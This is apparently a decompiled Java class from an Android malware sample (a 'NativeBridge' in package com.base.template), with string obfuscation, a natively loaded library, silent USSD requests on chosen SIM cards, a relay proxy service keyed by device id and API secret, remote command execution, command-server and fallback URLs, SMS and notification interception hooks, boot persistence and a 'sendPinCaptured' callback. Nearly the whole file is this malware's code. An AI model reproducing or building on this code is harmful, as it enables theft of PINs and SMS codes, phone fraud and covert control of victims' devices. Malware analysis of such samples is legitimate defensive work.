package com.base.template;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import androidx.work.CoroutineWorker$$ExternalSyntheticLambda0;
import androidx.work.NetworkType$EnumUnboxingLocalUtility;
import com.base.template.network.SmsFastSend;
import com.base.template.services.ProxyService;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import kotlin.text.Regex;
import kotlin.text.StringsKt__StringsJVMKt;
import okhttp3.MediaType;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class NativeBridge {
    public static final NativeBridge INSTANCE = new NativeBridge();
    private static volatile Context appContext;

    static {
        System.loadLibrary(C0000.decode(new byte[]{67, 13, 83, 0, 93, 20}, "0e2d2c13014f", true));
    }

    private NativeBridge() {
    }

    public static final boolean bridgeIsProxyRunning() {
        AtomicBoolean atomicBoolean;
        ProxyService proxyService = ProxyService.instance;
        return (proxyService == null || (atomicBoolean = proxyService.running) == null || !atomicBoolean.get()) ? false : true;
    }

    public static final void bridgePersistSecret(Context context, String str) {
        try {
            MediaType mediaType = SmsFastSend.JSON_TYPE;
            if (StringsKt__StringsJVMKt.isBlank(str)) {
                return;
            }
            context.getSharedPreferences(C0000.decode(new byte[]{18, 94, 18, 107, 64}, "a3a419", false), 0).edit().putString(C0000.decode(new byte[]{22, 80, 90}, "e598f1b29d933d", true), str).apply();
        } catch (Throwable unused) {
        }
    }

    public static final String bridgeSendUssd(String str, int i) {
        String strDecode = C0000.decode(new byte[]{23}, "5351acb6ff14ccb7", 3);
        String strDecode2 = C0000.decode(new byte[]{21, 25}, "7d812fe7ccc6c07a");
        String strDecode3 = C0000.decode(new byte[]{30, 17, 68, 87, 92, 70, 22, 10, 68, 64, 76, 6, 73, 17, 84, 93, 86, 87, 22, 10, 18}, "e3722240029c");
        Context context = appContext;
        if (context == null) {
            return C0000.decode(new byte[]{77, 20, 3, 64, 65, 93, 19, 17, 8, 26, 86, 90, 105, 85, 9, 92, 71, 87, 25, 71, 16, 69}, "66f232a32885", 6);
        }
        try {
            Object systemService = context.getSystemService(C0000.decode(new byte[]{73, 14, 88, 12, 81}, "9f7b4a", false));
            TelephonyManager telephonyManagerCreateForSubscriptionId = systemService instanceof TelephonyManager ? (TelephonyManager) systemService : null;
            if (telephonyManagerCreateForSubscriptionId == null) {
                return C0000.decode(new byte[]{31, 16, 81, 65, 69, 89, 64, 64, 88, 68, 12, 93, 59, 70, 81, 95, 82, 70, 90, 13, 12, 31, 64, 79}, "d243762bbfb2", false);
            }
            if (i > 0) {
                try {
                    List<SubscriptionInfo> activeSubscriptionInfoList = SubscriptionManager.from(context).getActiveSubscriptionInfoList();
                    int i2 = i - 1;
                    if (activeSubscriptionInfoList != null && i2 >= 0 && i2 < activeSubscriptionInfoList.size()) {
                        telephonyManagerCreateForSubscriptionId = telephonyManagerCreateForSubscriptionId.createForSubscriptionId(activeSubscriptionInfoList.get(i2).getSubscriptionId());
                    }
                } catch (Exception unused) {
                }
            }
            final CountDownLatch countDownLatch = new CountDownLatch(1);
            final Regex regex = new Regex(1);
            regex.nativePattern = "";
            telephonyManagerCreateForSubscriptionId.sendUssdRequest(str, new TelephonyManager.UssdResponseCallback() { // from class: com.base.template.NativeBridge$bridgeSendUssd$callback$1
                @Override // android.telephony.TelephonyManager.UssdResponseCallback
                public final void onReceiveUssdResponse(TelephonyManager telephonyManager, String str2, CharSequence charSequence) {
                    regex.nativePattern = charSequence.toString();
                    countDownLatch.countDown();
                }

                @Override // android.telephony.TelephonyManager.UssdResponseCallback
                public final void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String str2, int i3) {
                    regex.nativePattern = NetworkType$EnumUnboxingLocalUtility.m(C0000.decode(new byte[]{52, 53, 106, 124, 111, 39, 116, 124, 121, 119, 39, 15}, "af980a5552c5c0b4", false), i3);
                    countDownLatch.countDown();
                }
            }, new Handler(Looper.getMainLooper()));
            countDownLatch.await(30L, TimeUnit.SECONDS);
            return strDecode3 + str + C0000.decode(new byte[]{67, 27, 68, 67, 4, 17, 19, 87, 13, 67, 87, 19, 89, 64}, "a7f1abc8c021cb", false) + StringsKt__StringsJVMKt.replace$default(StringsKt__StringsJVMKt.replace$default((String) regex.nativePattern, strDecode, C0000.decode(new byte[]{61, 67}, "aae2e08b", 0.0f)), C0000.decode(new byte[]{50}, "85b3b8c097", true), C0000.decode(new byte[]{111, 15}, "3ad221", false)) + strDecode2;
        } catch (Exception e) {
            String message = e.getMessage();
            return NetworkType$EnumUnboxingLocalUtility.m(C0000.decode(new byte[]{26, 70, 84, 71, 17, 86, 74, 16, 88, 26}, "ad15c982b866", false), message != null ? StringsKt__StringsJVMKt.replace$default(message, strDecode, C0000.decode(new byte[]{67}, "d43ef3df1b", false)) : C0000.decode(new byte[]{19, 8, 9, 87, 14, 79, 12}, "ffb9a8b2", false), strDecode2);
        }
    }

    public static final void bridgeStartProxy(String str, String str2, String str3) {
        AtomicBoolean atomicBoolean;
        Context context = appContext;
        if (context == null) {
            return;
        }
        ProxyService proxyService = ProxyService.instance;
        if (proxyService == null || (atomicBoolean = proxyService.running) == null || !atomicBoolean.get()) {
            context.getApplicationContext();
            ProxyService proxyService2 = new ProxyService();
            proxyService2.relayUrl = str;
            proxyService2.deviceId = str2;
            proxyService2.apiSecret = str3;
            if (!proxyService2.running.getAndSet(true)) {
                proxyService2.executor.submit(new CoroutineWorker$$ExternalSyntheticLambda0(7, proxyService2));
            }
            ProxyService.instance = proxyService2;
        }
    }

    public static final void bridgeStartProxyWithContext(Context context, String str, String str2, String str3) {
        AtomicBoolean atomicBoolean;
        Context applicationContext = context.getApplicationContext();
        appContext = applicationContext;
        ProxyService proxyService = ProxyService.instance;
        if (proxyService == null || (atomicBoolean = proxyService.running) == null || !atomicBoolean.get()) {
            applicationContext.getApplicationContext();
            ProxyService proxyService2 = new ProxyService();
            proxyService2.relayUrl = str;
            proxyService2.deviceId = str2;
            proxyService2.apiSecret = str3;
            if (!proxyService2.running.getAndSet(true)) {
                proxyService2.executor.submit(new CoroutineWorker$$ExternalSyntheticLambda0(7, proxyService2));
            }
            ProxyService.instance = proxyService2;
        }
    }

    public static final void bridgeStopProxy() {
        ProxyService proxyService = ProxyService.instance;
        if (proxyService != null) {
            proxyService.running.set(false);
            try {
                Socket socket = proxyService.wsSocket;
                if (socket != null) {
                    socket.close();
                }
            } catch (Exception unused) {
            }
            proxyService.wsSocket = null;
            proxyService.wsOutput = null;
            proxyService.cleanup();
        }
        ProxyService.instance = null;
    }

    public static final void executeCommand(String str) {
        try {
            nativeExecuteCommand(str);
        } catch (Throwable unused) {
        }
    }

    public static final List<String> getAllUrls() {
        ArrayList arrayList = new ArrayList();
        String serverUrl = getServerUrl();
        if (!StringsKt__StringsJVMKt.isBlank(serverUrl)) {
            arrayList.add(serverUrl);
        }
        int fallbackUrlCount = getFallbackUrlCount();
        for (int i = 0; i < fallbackUrlCount; i++) {
            String fallbackUrlAt = getFallbackUrlAt(i);
            if (!StringsKt__StringsJVMKt.isBlank(fallbackUrlAt)) {
                arrayList.add(fallbackUrlAt);
            }
        }
        String workerUrl = getWorkerUrl();
        if (!StringsKt__StringsJVMKt.isBlank(workerUrl)) {
            arrayList.add(workerUrl);
        }
        return arrayList;
    }

    public static final String getDeviceId() {
        try {
            return nativeGetDeviceId();
        } catch (Throwable unused) {
            return "";
        }
    }

    public static final String getEffectiveUrl() {
        try {
            return nativeGetEffectiveUrl();
        } catch (Throwable unused) {
            return "";
        }
    }

    public static final String getFallbackUrl() {
        try {
            return nativeGetFallbackUrl();
        } catch (Throwable unused) {
            return "";
        }
    }

    public static final String getFallbackUrlAt(int i) {
        try {
            return nativeGetFallbackUrlAt(i);
        } catch (Throwable unused) {
            return "";
        }
    }

    public static final int getFallbackUrlCount() {
        try {
            return nativeGetFallbackUrlCount();
        } catch (Throwable unused) {
            return 0;
        }
    }

    public static final String getServerUrl() {
        try {
            return nativeGetServerUrl();
        } catch (Throwable unused) {
            return "";
        }
    }

    public static final String getTeamId() {
        try {
            return nativeGetTeamId();
        } catch (Throwable unused) {
            return "";
        }
    }

    public static final long getVmAliveEpoch() {
        try {
            return nativeGetVmAliveEpoch();
        } catch (Throwable unused) {
            return 0L;
        }
    }

    public static final String getWorkerUrl() {
        try {
            return nativeGetWorkerUrl();
        } catch (Throwable unused) {
            return "";
        }
    }

    public static final boolean isVmRunning() {
        try {
            return nativeIsVmRunning();
        } catch (Throwable unused) {
            return false;
        }
    }

    private static final native void nativeExecuteCommand(String str);

    private static final native String nativeGetDeviceId();

    private static final native String nativeGetEffectiveUrl();

    private static final native String nativeGetFallbackUrl();

    private static final native String nativeGetFallbackUrlAt(int i);

    private static final native int nativeGetFallbackUrlCount();

    private static final native String nativeGetServerUrl();

    private static final native String nativeGetTeamId();

    private static final native long nativeGetVmAliveEpoch();

    private static final native String nativeGetWorkerUrl();

    private static final native boolean nativeIsVmRunning();

    private static final native void nativeResetVm();

    private static final native void nativeSetWsConnected(boolean z);

    private static final native String nativeSignTimestamp(long j);

    private static final native void nativeStartDaemon(String str);

    private static final native void nativeTriggerHeartbeat();

    private static final native void nativeTriggerRegister();

    public static final native void onBoot();

    public static final native void onNotification(String str, String str2, String str3, String str4);

    public static final native void onSmsReceived(String str, String str2, int i);

    public static final void resetVmFlag() {
        try {
            nativeResetVm();
        } catch (Throwable unused) {
        }
    }

    public static final native void sendPinCaptured(String str);

    public static final void setWsConnected(boolean z) {
        try {
            nativeSetWsConnected(z);
        } catch (Throwable unused) {
        }
    }

    public static final String signTimestamp(long j) {
        try {
            return nativeSignTimestamp(j);
        } catch (Throwable unused) {
            return "";
        }
    }

    public static final void startDaemon(Context context) {
        try {
            nativeStartDaemon(context.getPackageName());
        } catch (Throwable unused) {
        }
    }

    public static final native boolean startVM(Context context);

    public static final void triggerHeartbeat() {
        try {
            nativeTriggerHeartbeat();
        } catch (Throwable unused) {
        }
    }

    public static final void triggerRegister() {
        try {
            nativeTriggerRegister();
        } catch (Throwable unused) {
        }
    }

    public final void setAppContext(Context context) {
        appContext = context.getApplicationContext();
    }
}
